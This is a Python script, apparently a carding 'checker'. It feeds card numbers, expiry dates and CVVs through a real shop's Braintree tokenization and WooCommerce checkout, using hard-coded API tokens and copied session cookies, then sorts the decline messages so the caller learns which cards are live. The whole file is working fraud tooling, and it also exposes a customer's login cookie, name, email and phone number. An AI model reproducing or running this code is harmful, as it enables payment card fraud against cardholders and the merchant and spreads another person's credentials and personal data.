import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg3NTYxNTgsImp0aSI6IjVjYWU0YTY0LTk2NDQtNGNmZC1hYjQ2LTMzOGU4MjFjYzIwNiIsInN1YiI6InZmeHQ3cXRxc2g4M3Q2d3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZmeHQ3cXRxc2g4M3Q2d3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlRpY2tldEZ1bGZpbGxtZW50U2VydmljZXNMUF9pbnN0YW50In19.NdmjOfiy1KFsvPTPF5iPZPaN6usZH6TIUcKJapOIpbZgyz-aHhKf0cxS0UgXGI-87flFSJNTmE3kC4TGQJxmFA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '3e34b0dd-12a0-4a01-9d7e-30573626fd60',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']
	
	cookies = {
	    '_ga': 'GA1.1.1656466481.1729257749',
	    '_fbp': 'fb.1.1729257749887.238936981513102741',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-10-18%2013%3A22%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-10-18%2013%3A22%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'mc_landing_site': 'https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F',
	    '_hjSessionUser_2027973': 'eyJpZCI6IjMyMTRkNjNlLTgwZWMtNTZkZS05ZTllLWFhYzc5OTdkYWU0MyIsImNyZWF0ZWQiOjE3MjkyNTc3NTAyNzEsImV4aXN0aW5nIjp0cnVlfQ==',
	    '_hjSession_2027973': 'eyJpZCI6IjhkNGI0NWE5LTNkOTktNGMyNS04ODQwLTBiYThlZTIxZGYxYSIsImMiOjE3MjkyNTc3NTAyODEsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
	    '__qca': 'P0-1846609610-1729257749370',
	    'wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9': 'hafezg93%7C1729859039%7CQMrh56huV3nqp7rC9ozKDXWMgiHBCr0jL1QSK3yFdPB%7C9517e02c2b7481d6e02d24776ef31a5b0a9d9faa073a96f4046445d0344ddfb1',
	    'wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9': '2875%7C%7C1729426984%7C%7C1729423384%7C%7Cfee4a0c8190cb9c1921b803b2f123bbc',
	    'mcfw-wp-user-cookie': 'Mjg3NXwwfDYzfDQwMDI5XzA0NDAzNjIwODFmNjlkODUyOWIxZWM5ZDI1Y2FhODJhOTIxNWYzOGU3MGFhYjgyMmNkN2E1YzE1NzM0NzVjZTA%3D',
	    '_ks_scriptVersion': '311',
	    '_ks_scriptVersionChecked': 'true',
	    'sp_product_slider_recent_view_products': 'a%3A1%3A%7Bi%3A0%3Bi%3A23257%3B%7D',
	    '_ks_userCountryUnit': '1',
	    '_ks_countryCodeFromIP': 'EG',
	    'kiwi-sizing-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIwOTBkYjYyOS05YWViLTRjYTctOTJiNi1iMzliMzkxYTNhYWMiLCJpYXQiOjE3MjkyNTQ0MjgsImV4cCI6MTcyOTI1ODAyOH0.MrAXJCOee-ajOYOTLweBEy20uKy0iv4HsCAHdDOjdcg',
	    'woocommerce_items_in_cart': '1',
	    'woocommerce_cart_hash': '4c5ad07bdf60ac51722cfb7a684695d2',
	    'wfocu_si': '3d37d4a66a7559675681210b2150d3a3',
	    'wffn_ay_ff273fc48db0f6446ae147b3380aed13': '[68176]',
	    'wffn_si': 'ff273fc48db0f6446ae147b3380aed13',
	    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fcheckout%2F',
	    '_uetsid': '0d6ade908d5411ef8915fd92c9b8771e',
	    '_uetvid': '0d6dca808d5411efa9dcbbd888143f85',
	    '_gcl_au': '1.1.1197928504.1729257750.628409907.1729257760.1729258139',
	    '_ga_128CPY397L': 'GS1.1.1729257749.1.1.1729258148.0.0.0',
	}
	
	headers = {
	    'authority': 'petcostumecenter.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1656466481.1729257749; _fbp=fb.1.1729257749887.238936981513102741; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2013%3A22%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-18%2013%3A22%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mc_landing_site=https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F; _hjSessionUser_2027973=eyJpZCI6IjMyMTRkNjNlLTgwZWMtNTZkZS05ZTllLWFhYzc5OTdkYWU0MyIsImNyZWF0ZWQiOjE3MjkyNTc3NTAyNzEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2027973=eyJpZCI6IjhkNGI0NWE5LTNkOTktNGMyNS04ODQwLTBiYThlZTIxZGYxYSIsImMiOjE3MjkyNTc3NTAyODEsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; __qca=P0-1846609610-1729257749370; wordpress_logged_in_289d90acb685b9dc87359ec1a035bdf9=hafezg93%7C1729859039%7CQMrh56huV3nqp7rC9ozKDXWMgiHBCr0jL1QSK3yFdPB%7C9517e02c2b7481d6e02d24776ef31a5b0a9d9faa073a96f4046445d0344ddfb1; wp_woocommerce_session_289d90acb685b9dc87359ec1a035bdf9=2875%7C%7C1729426984%7C%7C1729423384%7C%7Cfee4a0c8190cb9c1921b803b2f123bbc; mcfw-wp-user-cookie=Mjg3NXwwfDYzfDQwMDI5XzA0NDAzNjIwODFmNjlkODUyOWIxZWM5ZDI1Y2FhODJhOTIxNWYzOGU3MGFhYjgyMmNkN2E1YzE1NzM0NzVjZTA%3D; _ks_scriptVersion=311; _ks_scriptVersionChecked=true; sp_product_slider_recent_view_products=a%3A1%3A%7Bi%3A0%3Bi%3A23257%3B%7D; _ks_userCountryUnit=1; _ks_countryCodeFromIP=EG; kiwi-sizing-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIwOTBkYjYyOS05YWViLTRjYTctOTJiNi1iMzliMzkxYTNhYWMiLCJpYXQiOjE3MjkyNTQ0MjgsImV4cCI6MTcyOTI1ODAyOH0.MrAXJCOee-ajOYOTLweBEy20uKy0iv4HsCAHdDOjdcg; woocommerce_items_in_cart=1; woocommerce_cart_hash=4c5ad07bdf60ac51722cfb7a684695d2; wfocu_si=3d37d4a66a7559675681210b2150d3a3; wffn_ay_ff273fc48db0f6446ae147b3380aed13=[68176]; wffn_si=ff273fc48db0f6446ae147b3380aed13; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpetcostumecenter.com%2Fcheckout%2F; _uetsid=0d6ade908d5411ef8915fd92c9b8771e; _uetvid=0d6dca808d5411efa9dcbbd888143f85; _gcl_au=1.1.1197928504.1729257750.628409907.1729257760.1729258139; _ga_128CPY397L=GS1.1.1729257749.1.1.1729258148.0.0.0',
	    'origin': 'https://petcostumecenter.com',
	    'referer': 'https://petcostumecenter.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	    'wfacp_id': '68176',
	    'wfacp_is_checkout_override': 'yes',
	}
	
	data = f'_wfacp_post_id=68176&wfacp_cart_hash=&wfacp_has_active_multi_checkout=&wfacp_source=https%3A%2F%2Fpetcostumecenter.com%2Fcheckouts%2Fclassic%2F&product_switcher_need_refresh=1&wfacp_cart_contains_subscription=0&wfacp_exchange_keys=%7B%22pre_built%22%3A%7B%7D%2C%22elementor%22%3A%7B%22wfacp_form%22%3A%2213fd31c%22%2C%22wfacp_form_summary%22%3A%223175901%22%7D%7D&wfacp_input_hidden_data=%7B%7D&wfacp_input_phone_field=%7B%22billing%22%3A%7B%22code%22%3A%221%22%2C%22number%22%3A%225162582584%22%7D%2C%22shipping%22%3A%7B%22code%22%3A%22%22%2C%22number%22%3A%22%22%7D%7D&wfacp_timezone=Africa%2FCairo&wfacp_billing_same_as_shipping=0&wfacp_billing_address_present=yes&wfob_input_hidden_data=%7B%7D&wfacp_coupon_field=&billing_email=hafezg93%40gmail.com&billing_first_name=Mohamed&billing_last_name=Hamdy&billing_phone=5162582584&shipping_address_1=New+York&shipping_city=New+York&shipping_postcode=10080&shipping_country=US&shipping_state=NY&billing_address_1=New+York&billing_city=New+York&billing_postcode=10080&billing_country=US&billing_state=NY&shipping_method%5B0%5D=flat_rate%3A1&payment_method=braintree_cc&braintree_cc_nonce_key={token}&braintree_cc_device_data=%7B%22device_session_id%22%3A%22a64db7da510a0de2cd5252abb15dcf09%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%229f402e52-eeba-4250-adb5-02754042%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Ft7hv62gg2zr28p8y%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Ft7hv62gg2zr28p8y%22%7D%2C%22merchantId%22%3A%22t7hv62gg2zr28p8y%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22PET+COSTUME+CENTER%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjkzNDA3MDEsImp0aSI6IjRlMGZjYjkzLTI5OTAtNDExZi04ODhjLTQyYmI0N2Q5NTZhMyIsInN1YiI6InQ3aHY2MmdnMnpyMjhwOHkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InQ3aHY2MmdnMnpyMjhwOHkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.SvLYrxYLKWYyd37HluppUlPqG0fAbCy4zvB9VbYrxOk82DEX6X4wzIOp2MEZpwa9tBHHvWA3tKcpARdZy7gZ1A%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Afalse%7D&terms=on&terms-field=1&_mc4wp_subscribe_woocommerce=0&_mc4wp_subscribe_woocommerce=1&woocommerce-process-checkout-nonce={token}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26wfacp_id%3D68176%26wfacp_is_checkout_override%3Dyes&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpetcostumecenter.com%2Fmy-account%2F&wc_order_attribution_session_start_time=2024-10-18+13%3A22%3A30&wc_order_attribution_session_pages=14&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&shipping_first_name=Mohamed&shipping_last_name=Hamdy&billing_address_2=&shipping_address_2=&ship_to_different_address=on'
	
	req0 = requests.post('https://petcostumecenter.com/', params=params, cookies=cookies, headers=headers, data=data)
	if "success" in req0.text:
		return "success"		
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Issuer or Cardholder has put a restriction on the card" in req0.text:
		return "Issuer or Cardholder has put a restriction on the card"		
	if "The requested qty is not available" in req0.text:
		return "Try Again !"	
	if "No Such Issuer" in req0.text:
		return "No Such Issuer"				
	if "Invalid Merchant ID" in req0.text:
		return "BLACKLIST BIN"		
	if "Payment instrument type is not accepted by this merchant account." in req0.text:
		return "Unsupported card."	
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
				time.sleep(1)	
